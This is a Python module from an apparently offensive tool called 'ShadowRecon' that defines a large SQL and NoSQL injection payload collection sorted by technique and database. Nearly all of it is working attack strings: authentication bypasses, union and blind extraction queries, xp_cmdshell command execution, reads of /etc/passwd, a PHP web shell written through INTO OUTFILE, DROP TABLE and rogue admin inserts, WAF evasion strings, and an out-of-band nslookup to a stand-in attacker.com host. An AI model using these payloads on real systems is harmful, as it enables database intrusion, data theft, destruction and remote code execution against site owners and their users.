"""
Advanced SQLi Payloads for ShadowRecon v1.0
Developed by kernelpanic | A product of infosbios

Comprehensive SQL Injection payload collection
"""

class SQLiPayloads:
    """Advanced SQL Injection payload collection"""

    # Basic SQLi payloads
    BASIC_SQLI = [
        "'",
        '"',
        "'OR'1'='1",
        '"OR"1"="1',
        'OR 1=1',
        "' OR 1=1--",
        '" OR 1=1--',
        "' OR '1'='1'--",
        '" OR "1"="1"--',
        "' OR 1=1#",
        '" OR 1=1#',
        "admin'--",
        'admin"--',
        "admin'/*",
        'admin"/*',
    ]

    # Union-based payloads
    UNION_BASED = [
        "' UNION SELECT NULL--",
        '" UNION SELECT NULL--',
        "' UNION SELECT NULL,NULL--",
        '" UNION SELECT NULL,NULL--',
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT 1,version(),3--",
        "' UNION SELECT 1,database(),3--",
        "' UNION SELECT 1,user(),3--",
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT schema_name FROM information_schema.schemata--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns--",
    ]

    # Boolean-based payloads
    BOOLEAN_BASED = [
        "' AND 1=1--",
        "' AND 1=2--",
        '" AND 1=1--',
        '" AND 1=2--',
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND (SELECT LENGTH(database()))>0--",
        "' AND ASCII(SUBSTRING(database(),1,1))>64--",
        "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64--",
    ]

    # Time-based blind payloads
    TIME_BASED = [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "' AND (SELECT SLEEP(5))--",
        "'; pg_sleep(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR (SELECT SLEEP(5) FROM information_schema.tables LIMIT 1)--",
        "'; BENCHMARK(50000000,MD5(1))--",
        "' AND (SELECT BENCHMARK(50000000,MD5(1)))--",
        "' RLIKE SLEEP(5)--",
        "' AND ELT(1,SLEEP(5))--",
    ]

    # Error-based payloads
    ERROR_BASED = [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
        "' AND GTID_SUBSET(version(),1)--",
        "' OR (SELECT * FROM (SELECT name_const(version(),1),name_const(version(),1))x)--",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))--",
        "' AND (SELECT * FROM (SELECT(FLOOR(RAND()*2))x,COUNT(*)a FROM information_schema.tables GROUP BY x)b)--",
    ]

    # MSSQL-specific payloads
    MSSQL_PAYLOADS = [
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--",
        "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Services\\MSSQLSERVER','ObjectName'--",
        "'; EXEC sp_configure 'show advanced options',1--",
        "'; EXEC sp_configure 'xp_cmdshell',1--",
        "'; RECONFIGURE--",
        "' AND 1=(SELECT @@version)--",
        "' AND 1=(SELECT db_name())--",
        "' AND 1=(SELECT user_name())--",
        "' AND 1=(SELECT system_user)--",
        "' UNION SELECT name FROM master..sysdatabases--",
        "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
    ]

    # MySQL-specific payloads
    MYSQL_PAYLOADS = [
        "' AND 1=(SELECT version())--",
        "' AND 1=(SELECT database())--",
        "' AND 1=(SELECT user())--",
        "' AND 1=(SELECT current_user())--",
        "' UNION SELECT 1,load_file('/etc/passwd'),3--",
        "' UNION SELECT 1,load_file('C:\\windows\\system32\\drivers\\etc\\hosts'),3--",
        "' INTO OUTFILE '/var/www/html/shell.php'--",
        "' UNION SELECT '<?php system($_GET[cmd]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e)),1)--",
    ]

    # PostgreSQL-specific payloads
    POSTGRESQL_PAYLOADS = [
        "'; SELECT version()--",
        "'; SELECT current_database()--",
        "'; SELECT current_user--",
        "'; SELECT session_user--",
        "'; SELECT schemaname FROM pg_tables--",
        "'; SELECT tablename FROM pg_tables--",
        "'; SELECT column_name FROM information_schema.columns--",
        "'; COPY (SELECT version()) TO PROGRAM 'nslookup version.attacker.com'--",
        "'; SELECT pg_sleep(5)--",
        "'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT--",
    ]

    # Oracle-specific payloads
    ORACLE_PAYLOADS = [
        "' AND 1=(SELECT banner FROM v$version WHERE rownum=1)--",
        "' AND 1=(SELECT user FROM dual)--",
        "' AND 1=(SELECT instance_name FROM v$instance)--",
        "' UNION SELECT banner,NULL FROM v$version--",
        "' UNION SELECT table_name,NULL FROM user_tables--",
        "' UNION SELECT column_name,NULL FROM user_tab_columns--",
        "'; BEGIN DBMS_LOCK.SLEEP(5); END;--",
        "' AND (SELECT COUNT(*) FROM user_tables)>0--",
        "' AND LENGTH((SELECT user FROM dual))>0--",
    ]

    # NoSQL injection payloads
    NOSQL_PAYLOADS = [
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.match(/.*/)"}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$in":["admin","administrator","root"]}}',
        '{"$or": [{"username": "admin"}, {"username": "root"}]}',
        '{"username": {"$regex": "^adm"}}',
        '{"password": {"$exists": true}}',
    ]

    # Second-order SQLi payloads
    SECOND_ORDER = [
        "admin'/**/union/**/select/**/1,2,3--",
        'admin"/**/union/**/select/**/1,2,3--',
        "admin'; DROP TABLE users; --",
        'admin"; DROP TABLE users; --',
        "admin' AND (SELECT SLEEP(5))--",
        "admin'; INSERT INTO users VALUES ('hacker','password','admin')--",
        "admin' UNION SELECT load_file('/etc/passwd'),2,3--",
    ]

    # WAF bypass payloads
    WAF_BYPASS = [
        "/*!50000UNION*/ /*!50000SELECT*/",
        "uni%6fn sel%65ct",
        "UNI%00ON SEL%00ECT",
        "/**/UNION/**/SELECT/**/",
        "+UNION+SELECT+",
        "UNION/**/SELECT/**/",
        "UNION SELECT/**/",
        "/**/union/**/select/**/",
        "union/**/select/**/",
        "/*!UNION*/ /*!SELECT*/",
        "/*!50000UNION SELECT*/",
        "/*!12345UNION SELECT*/",
        "%2f%2a*/UNION%2f%2a */SELECT%2f%2a*/",
    ]

    @classmethod
    def get_all_payloads(cls) -> list:
        """Get all SQL injection payloads"""
        all_payloads = []
        all_payloads.extend(cls.BASIC_SQLI)
        all_payloads.extend(cls.UNION_BASED)
        all_payloads.extend(cls.BOOLEAN_BASED)
        all_payloads.extend(cls.TIME_BASED)
        all_payloads.extend(cls.ERROR_BASED)
        all_payloads.extend(cls.MSSQL_PAYLOADS)
        all_payloads.extend(cls.MYSQL_PAYLOADS)
        all_payloads.extend(cls.POSTGRESQL_PAYLOADS)
        all_payloads.extend(cls.ORACLE_PAYLOADS)
        all_payloads.extend(cls.NOSQL_PAYLOADS)
        all_payloads.extend(cls.SECOND_ORDER)
        all_payloads.extend(cls.WAF_BYPASS)
        return all_payloads

    @classmethod
    def get_database_payloads(cls, database_type: str) -> list:
        """Get database-specific payloads"""
        db_map = {
            'mysql': cls.MYSQL_PAYLOADS + cls.BASIC_SQLI + cls.UNION_BASED,
            'mssql': cls.MSSQL_PAYLOADS + cls.BASIC_SQLI + cls.UNION_BASED,
            'postgresql': cls.POSTGRESQL_PAYLOADS + cls.BASIC_SQLI + cls.UNION_BASED,
            'oracle': cls.ORACLE_PAYLOADS + cls.BASIC_SQLI + cls.UNION_BASED,
            'nosql': cls.NOSQL_PAYLOADS,
            'mongodb': cls.NOSQL_PAYLOADS
        }
        return db_map.get(database_type.lower(), cls.BASIC_SQLI)

    @classmethod
    def get_technique_payloads(cls, technique: str) -> list:
        """Get technique-specific payloads"""
        technique_map = {
            'union': cls.UNION_BASED,
            'boolean': cls.BOOLEAN_BASED,
            'time': cls.TIME_BASED,
            'error': cls.ERROR_BASED,
            'waf_bypass': cls.WAF_BYPASS
        }
        return technique_map.get(technique.lower(), cls.BASIC_SQLI)
